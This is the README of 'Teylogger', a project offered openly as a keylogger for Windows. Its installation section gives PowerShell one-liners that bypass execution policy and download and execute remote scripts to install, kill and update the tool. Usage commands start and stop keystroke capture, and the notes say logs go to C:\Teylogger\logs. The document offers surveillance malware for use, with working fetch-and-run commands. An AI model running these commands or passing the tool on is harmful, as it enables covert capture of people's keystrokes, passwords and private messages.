# Teylogger

```
  _____            _
 |_   _|___  _  _ | | ___  __ _  __ _  ___  _ _
   | | / -_)| || || |/ _ \/ _` |/ _` |/ -_)| '_|
   |_| \___| \_, ||_|\___/\__, |\__, |\___||_|
             |__/         |___/ |___/   @uynilo9
``` 

## 💡 Introduction

```Teylogger```⌨  is a tiny and complete keylogger for ```Windows```⊞.

## 📦 Installation

📥 Install ```Teylogger```⌨ application:

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force; Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/uynilo9/teylogger/main/installation/install.ps1'))
```

🗑️ Kill ```Teylogger```⌨ application:

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force; Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/uynilo9/teylogger/main/installation/kill.ps1'))
```

✨ Update ```Teylogger```⌨ application:

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force; Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/uynilo9/teylogger/main/installation/update.ps1'))
```

## 📜 Usage

🕹 Start listening:

```terminal
teyl start
```

🛑 Stop listening:

```terminal
teyl stop
```

🏷 Check out the version:

```terminal
teyl version
```

## ⚠ Warning

- 🐚 Best experience:

Please use ```Powershell``` for the best experience if you want.

- 💻 Some binary code:

This application include ```windows.h``` , it also includes ```winuser.h```, and it's based on US keyboard, if you're using a non-US keyboard, it may cause this issue.

- 🌌 Sometimes no response:

Also, because it's based on US keyboard, if you're using a non-US keyboard, it may cause this issue.

- 📁 Specific directory:

It exists under a specific directory ```C:\Teylogger```, please don't change it, otherwise it won't work.

- 📄 Where are the log files:

They are saved under ```C:\Teylogger\logs```.

## ⚖ License

<p>
MIT License

Copyright (c) 2022 uynilo9

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
</p>